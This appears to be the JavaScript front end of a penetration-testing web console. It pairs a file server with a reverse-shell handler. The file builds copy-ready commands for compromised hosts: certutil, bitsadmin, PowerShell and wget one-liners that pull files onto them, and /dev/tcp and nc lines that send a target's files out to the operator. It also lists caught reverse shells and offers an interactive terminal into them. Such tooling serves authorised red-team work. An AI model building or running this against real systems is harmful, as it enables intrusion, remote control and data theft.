// === State ===
let currentPath = "/";
let currentFile = null;
let ws = null;
let shellPollTimer = null;
let viewerCurrentPath = null;

// === DOM ===
const tFiles = document.getElementById("tab-files");
const tShells = document.getElementById("tab-shells");
const fsDiv = document.getElementById("file-share");
const shDiv = document.getElementById("shell-handler");
const fileList = document.getElementById("file-list");
const shellList = document.getElementById("shell-list");
const ctxMenu = document.getElementById("ctx-menu");
const pathDisplay = document.getElementById("current-path");
const fileInput = document.getElementById("file-input");
const shellListView = document.getElementById("shell-list-view");
const shellTerminal = document.getElementById("shell-terminal");
const termOutput = document.getElementById("terminal-output");
const termInput = document.getElementById("terminal-input");
const termTitle = document.getElementById("terminal-title");
const termBack = document.getElementById("terminal-back");
const catchInfo = document.getElementById("catch-info");
const catchStatus = document.getElementById("catch-status");
const catchCmds = document.getElementById("catch-cmds");
const fileViewer = document.getElementById("file-viewer");
const viewerBack = document.getElementById("viewer-back");
const viewerTitle = document.getElementById("viewer-title");
const viewerContent = document.getElementById("viewer-content");
const viewerInfo = document.getElementById("viewer-info");
const viewerTextBtn = document.getElementById("viewer-text");
const viewerHexBtn = document.getElementById("viewer-hex");
const toolbar = document.querySelector(".toolbar");

// === Tabs ===
tFiles.onclick = () => {
  tFiles.classList.add("active");
  tShells.classList.remove("active");
  fsDiv.classList.remove("hidden");
  shDiv.classList.add("hidden");
  stopShellPolling();
};
tShells.onclick = () => {
  tShells.classList.add("active");
  tFiles.classList.remove("active");
  shDiv.classList.remove("hidden");
  fsDiv.classList.add("hidden");
  loadShells();
  startShellPolling();
};

// === Helpers ===
function esc(s) {
  const d = document.createElement("div");
  d.textContent = s;
  return d.innerHTML;
}

function formatSize(bytes) {
  if (bytes === 0) return "0 B";
  const k = 1024;
  const sizes = ["B", "KB", "MB", "GB"];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return (bytes / Math.pow(k, i)).toFixed(i ? 1 : 0) + " " + sizes[i];
}

function copyText(text) {
  navigator.clipboard.writeText(text).catch(() => prompt("Copy:", text));
}

function makeCmdLine(cmd, container) {
  const div = document.createElement("div");
  div.className = "catch-cmd";
  div.innerHTML = "<code>" + esc(cmd) + '</code><span class="copy-tag">click to copy</span>';
  div.onclick = () => copyText(cmd);
  container.appendChild(div);
}

// === File Share ===
async function loadFiles(path) {
  currentPath = path || "/";
  pathDisplay.textContent = currentPath;
  try {
    const res = await fetch("/api/files?path=" + encodeURIComponent(currentPath));
    const data = await res.json();
    renderFiles(data.entries || []);
  } catch (e) {
    fileList.innerHTML = "<li>Error loading files</li>";
  }
}

function renderFiles(entries) {
  fileList.innerHTML = "";
  if (currentPath !== "/") {
    const li = document.createElement("li");
    li.textContent = "../";
    li.onclick = () => {
      const parent = currentPath.replace(/\/[^/]+\/?$/, "") || "/";
      loadFiles(parent);
    };
    fileList.appendChild(li);
  }
  entries.forEach((f) => {
    const li = document.createElement("li");
    const name = f.is_dir ? f.name + "/" : f.name;
    const size = f.is_dir ? "" : formatSize(f.size);
    li.innerHTML =
      "<span>" + esc(name) + '</span><span class="file-size">' + size + "</span>";
    li.dataset.name = f.name;
    if (f.is_dir) {
      li.ondblclick = () => {
        loadFiles(currentPath === "/" ? "/" + f.name : currentPath + "/" + f.name);
      };
    }
    if (!f.is_dir) {
      li.ondblclick = () => {
        const filePath = currentPath === "/" ? "/" + f.name : currentPath + "/" + f.name;
        viewFile(filePath, f.name, "text");
      };
      li.addEventListener("contextmenu", (e) => {
        e.preventDefault();
        currentFile = f.name;
        showCtxMenu(e.pageX, e.pageY, f.name);
      });
    }
    fileList.appendChild(li);
  });
}

// Upload
document.getElementById("upload-btn").onclick = () => fileInput.click();
fileInput.onchange = async () => {
  for (const file of fileInput.files) {
    const form = new FormData();
    form.append("file", file);
    await fetch("/api/files/upload?path=" + encodeURIComponent(currentPath), {
      method: "POST",
      body: form,
    });
  }
  fileInput.value = "";
  loadFiles(currentPath);
};

// New Folder
document.getElementById("newdir-btn").onclick = () => {
  const name = prompt("Folder name:");
  if (!name) return;
  const path = currentPath === "/" ? "/" + name : currentPath + "/" + name;
  fetch("/api/files/mkdir", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ path: path }),
  }).then(() => loadFiles(currentPath));
};

// Catch (receive file from target via /dev/tcp or nc)
document.getElementById("catch-btn").onclick = async () => {
  const filename = prompt("Save incoming file as:", "caught_file");
  if (!filename) return;

  const res = await fetch("/api/files/catch", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ filename: filename }),
  });
  const data = await res.json();
  const port = data.port;
  const hostname = location.hostname;

  catchStatus.textContent = "Listening on :" + port + " (5 min timeout)";
  catchCmds.innerHTML = "";
  const cmds = [
    "cat /path/to/file > /dev/tcp/" + hostname + "/" + port,
    "nc " + hostname + " " + port + " < /path/to/file",
    "bash -c 'cat /path/to/file > /dev/tcp/" + hostname + "/" + port + "'",
  ];
  cmds.forEach((c) => makeCmdLine(c, catchCmds));
  catchInfo.classList.remove("hidden");
};

document.getElementById("catch-close").onclick = () => {
  catchInfo.classList.add("hidden");
};

// Path click -> root
pathDisplay.onclick = () => loadFiles("/");

// === File Viewer ===
async function viewFile(filePath, filename, mode) {
  mode = mode || "text";
  viewerCurrentPath = filePath;

  const res = await fetch(
    "/api/files/preview?path=" + encodeURIComponent(filePath) + "&mode=" + mode
  );
  const data = await res.json();

  viewerTitle.textContent = filename;
  viewerContent.textContent = data.content;

  if (data.truncated) {
    viewerInfo.textContent = "Showing first 1 MB of " + formatSize(data.size);
    viewerInfo.classList.remove("hidden");
  } else {
    viewerInfo.classList.add("hidden");
  }

  viewerTextBtn.classList.toggle("active", mode === "text");
  viewerHexBtn.classList.toggle("active", mode === "hex");

  // Show viewer, hide file list
  toolbar.classList.add("hidden");
  catchInfo.classList.add("hidden");
  fileList.classList.add("hidden");
  fileViewer.classList.remove("hidden");
}

viewerBack.onclick = () => {
  fileViewer.classList.add("hidden");
  toolbar.classList.remove("hidden");
  fileList.classList.remove("hidden");
};

viewerTextBtn.onclick = () => {
  viewFile(viewerCurrentPath, viewerTitle.textContent, "text");
};

viewerHexBtn.onclick = () => {
  viewFile(viewerCurrentPath, viewerTitle.textContent, "hex");
};

// === Context Menu ===
function showCtxMenu(x, y, filename) {
  ctxMenu.style.top = y + "px";
  ctxMenu.style.left = x + "px";
  ctxMenu.style.display = "block";

  const host = location.host;
  const hostname = location.hostname;
  const filePath =
    currentPath === "/" ? "/" + filename : currentPath + "/" + filename;
  const url = "http://" + host + "/dl" + filePath;

  // --- Linux commands ---
  const linuxEl = document.getElementById("linux-cmds");
  linuxEl.innerHTML = "";

  const linuxHttp = [
    "wget " + url + " -O " + filename,
    "curl " + url + " -o " + filename,
    "python3 -c \"import urllib.request;urllib.request.urlretrieve('" + url + "','" + filename + "')\"",
    "python -c \"import urllib;urllib.urlretrieve('" + url + "','" + filename + "')\"",
    "php -r \"file_put_contents('" + filename + "',file_get_contents('" + url + "'));\"",
  ];

  linuxHttp.forEach((cmd) => {
    const li = document.createElement("li");
    li.textContent = cmd;
    li.title = cmd;
    li.onclick = (e) => { e.stopPropagation(); copyText(cmd); ctxMenu.style.display = "none"; };
    linuxEl.appendChild(li);
  });

  // /dev/tcp and nc — open port, serve file
  ["/dev/tcp", "nc"].forEach((tool) => {
    const li = document.createElement("li");
    li.textContent = tool + " (open port)";
    li.onclick = async (e) => {
      e.stopPropagation();
      const res = await fetch("/api/files/serve", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ path: filePath }),
      });
      const data = await res.json();
      const port = data.port;
      let cmd;
      if (tool === "/dev/tcp") {
        cmd = "cat < /dev/tcp/" + hostname + "/" + port + " > " + filename;
      } else {
        cmd = "nc " + hostname + " " + port + " > " + filename;
      }
      copyText(cmd);
      ctxMenu.style.display = "none";
    };
    linuxEl.appendChild(li);
  });

  // --- Windows commands ---
  const winEl = document.getElementById("windows-cmds");
  winEl.innerHTML = "";

  const winCmds = [
    "certutil -urlcache -split -f " + url + " " + filename,
    "powershell -c \"iwr " + url + " -OutFile " + filename + "\"",
    "powershell -c \"(New-Object Net.WebClient).DownloadFile('" + url + "','" + filename + "')\"",
    "bitsadmin /transfer n /priority high " + url + " %cd%\\" + filename,
    "powershell -c \"Start-BitsTransfer -Source '" + url + "' -Destination '" + filename + "'\"",
  ];

  winCmds.forEach((cmd) => {
    const li = document.createElement("li");
    li.textContent = cmd;
    li.title = cmd;
    li.onclick = (e) => { e.stopPropagation(); copyText(cmd); ctxMenu.style.display = "none"; };
    winEl.appendChild(li);
  });
}

document.addEventListener("click", (e) => {
  if (!e.target.closest(".context-menu")) ctxMenu.style.display = "none";
});

ctxMenu.querySelectorAll("li[data-action]").forEach((item) => {
  item.addEventListener("click", () => {
    const action = item.dataset.action;
    const filePath =
      currentPath === "/" ? "/" + currentFile : currentPath + "/" + currentFile;

    if (action === "view") {
      viewFile(filePath, currentFile, "text");
    } else if (action === "download") {
      window.open("/api/files/download?path=" + encodeURIComponent(filePath));
    } else if (action === "rename") {
      const newName = prompt("New name:", currentFile);
      if (!newName || newName === currentFile) return;
      const newPath =
        currentPath === "/" ? "/" + newName : currentPath + "/" + newName;
      fetch("/api/files/rename", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ old_path: filePath, new_path: newPath }),
      }).then(() => loadFiles(currentPath));
    } else if (action === "delete") {
      if (!confirm("Delete " + currentFile + "?")) return;
      fetch("/api/files?path=" + encodeURIComponent(filePath), {
        method: "DELETE",
      }).then(() => loadFiles(currentPath));
    }
    ctxMenu.style.display = "none";
  });
});

// === Reverse Shells ===
async function loadShells() {
  try {
    const res = await fetch("/api/shells");
    const data = await res.json();
    renderShells(data.shells || []);
  } catch (e) {
    shellList.innerHTML = "<li>Error loading shells</li>";
  }
}

function renderShells(shells) {
  shellList.innerHTML = "";
  if (shells.length === 0) {
    shellList.innerHTML = "<li>No active shells</li>";
    return;
  }
  shells.forEach((s) => {
    const li = document.createElement("li");
    li.innerHTML =
      "<span>#" + s.id + " &mdash; " + esc(s.remote_addr) + "</span>" +
      '<span class="shell-actions">' +
      '<button onclick="connectShell(' + s.id + ",'" + esc(s.remote_addr) + "'" + ')">Connect</button>' +
      '<button onclick="killShell(' + s.id + ')">Kill</button>' +
      "</span>";
    shellList.appendChild(li);
  });
}

function startShellPolling() {
  stopShellPolling();
  shellPollTimer = setInterval(loadShells, 3000);
}

function stopShellPolling() {
  if (shellPollTimer) {
    clearInterval(shellPollTimer);
    shellPollTimer = null;
  }
}

window.killShell = async function (id) {
  await fetch("/api/shells/" + id, { method: "DELETE" });
  loadShells();
};

// === Terminal ===
window.connectShell = function (id, addr) {
  stopShellPolling();
  shellListView.classList.add("hidden");
  shellTerminal.classList.remove("hidden");
  termTitle.textContent = "Shell #" + id + " \u2014 " + addr;
  termOutput.textContent = "";

  const proto = location.protocol === "https:" ? "wss:" : "ws:";
  ws = new WebSocket(proto + "//" + location.host + "/ws/shell/" + id);

  ws.onmessage = (e) => {
    termOutput.textContent += e.data;
    termOutput.scrollTop = termOutput.scrollHeight;
  };

  ws.onclose = () => {
    termOutput.textContent += "\n[Connection closed]\n";
  };

  termInput.focus();
};

termInput.addEventListener("keydown", (e) => {
  if (e.key === "Enter") {
    if (ws && ws.readyState === WebSocket.OPEN) {
      ws.send(termInput.value + "\n");
    }
    termInput.value = "";
  }
});

termBack.onclick = () => {
  if (ws) {
    ws.close();
    ws = null;
  }
  shellTerminal.classList.add("hidden");
  shellListView.classList.remove("hidden");
  loadShells();
  startShellPolling();
};

// === Init ===
loadFiles("/");
